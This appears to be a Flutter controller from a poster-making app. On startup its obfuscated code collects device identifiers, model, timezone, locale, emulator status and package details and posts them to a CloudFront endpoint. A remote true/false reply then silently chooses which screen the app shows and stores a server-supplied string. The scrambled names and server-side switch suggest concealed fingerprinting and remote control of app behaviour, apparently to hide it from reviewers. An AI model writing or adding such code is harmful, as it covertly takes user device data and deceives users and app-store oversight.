import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class PosterCreateLogic extends GetxController {

  var kmyboj = RxBool(false);
  var wfrvnkypaj = RxBool(true);
  var qlbxyaf = RxString("");
  var leonard = RxBool(false);
  var kautzer = RxBool(true);
  final hnzxur = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ubog();
  }


  Future<void> ubog() async {
    leonard.value = true;
    kautzer.value = true;
    wfrvnkypaj.value = false;

    hnzxur.post("https://divfe457pu66b.cloudfront.net/v1V7KX7m",data: await hrqgtfm()).then((value) {
      var jsnbrek = value.data["jsnbrek"] as String;
      var fobkpgzx = value.data["fobkpgzx"] as bool;
      if (fobkpgzx) {
        qlbxyaf.value = jsnbrek;
        edwardo();
      } else {
        walsh();
      }
    }).catchError((e) {
      wfrvnkypaj.value = true;
      kautzer.value = true;
      leonard.value = false;
    });
  }

  Future<Map<String, dynamic>> hrqgtfm() async {
    final DeviceInfoPlugin xbyzvh = DeviceInfoPlugin();
    PackageInfo pfjw_mlso = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var plgjm = Platform.localeName;
    var NPBpQEIW = currentTimeZone;

    var YbWdxLMN = pfjw_mlso.packageName;
    var RAwyV = pfjw_mlso.version;
    var PGaK = pfjw_mlso.buildNumber;

    var gSFoXQuB = pfjw_mlso.appName;
    var kFxMhPCp = "";
    var crflpt  = "";
    var xyWmaF = "";
    var keonRice = "";
    var marielleGlover = "";
    var charliePagac = "";
    var rosettaLesch = "";
    var eldonErdman = "";


    var ZGfQt = "";
    var FmNYbwI = false;

    if (GetPlatform.isAndroid) {
      ZGfQt = "android";
      var mjftpr = await xbyzvh.androidInfo;

      xyWmaF = mjftpr.brand;

      kFxMhPCp  = mjftpr.model;
      crflpt = mjftpr.id;

      FmNYbwI = mjftpr.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ZGfQt = "ios";
      var xluaqz = await xbyzvh.iosInfo;
      xyWmaF = xluaqz.name;
      kFxMhPCp = xluaqz.model;

      crflpt = xluaqz.identifierForVendor ?? "";
      FmNYbwI  = xluaqz.isPhysicalDevice;
    }
    var res = {
      "PGaK": PGaK,
      "RAwyV": RAwyV,
      "YbWdxLMN": YbWdxLMN,
      "kFxMhPCp": kFxMhPCp,
      "rosettaLesch" : rosettaLesch,
      "NPBpQEIW": NPBpQEIW,
      "marielleGlover" : marielleGlover,
      "xyWmaF": xyWmaF,
      "crflpt": crflpt,
      "gSFoXQuB": gSFoXQuB,
      "plgjm": plgjm,
      "ZGfQt": ZGfQt,
      "FmNYbwI": FmNYbwI,
      "keonRice" : keonRice,
      "charliePagac" : charliePagac,
      "eldonErdman" : eldonErdman,

    };
    return res;
  }

  Future<void> walsh() async {
    Get.offNamed("/poster_tab");
  }

  Future<void> edwardo() async {
    Get.offNamed("/image_create");
  }

}
